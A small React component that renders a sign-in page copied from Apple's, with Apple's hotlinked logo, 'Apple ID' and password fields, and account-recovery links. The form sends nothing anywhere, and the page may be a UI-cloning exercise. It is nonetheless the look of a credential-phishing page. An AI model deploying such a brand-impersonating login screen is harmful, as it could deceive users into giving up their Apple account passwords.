import React from 'react';
import './App.css';

const App: React.FC = () => {
    return (
        <div className="login-container">
            <div className="login-box">
                <img src="https://www.apple.com/ac/structured-data/images/knowledge_graph_logo.png?202306210725" alt="Apple Logo" className="logo"/>
                <h1>Sign In</h1>
                <form>
                    <input type="text" placeholder="Apple ID" className="input-field"/>
                    <input type="password" placeholder="Password" className="input-field"/>
                    <button type="submit" className="login-button">Sign In</button>
                </form>
                <div className="additional-links">
                    <a href="#">Forgot Apple ID or password?</a>
                    <a href="#">Create your Apple ID</a>
                </div>
            </div>
        </div>
    );
};

export default App;
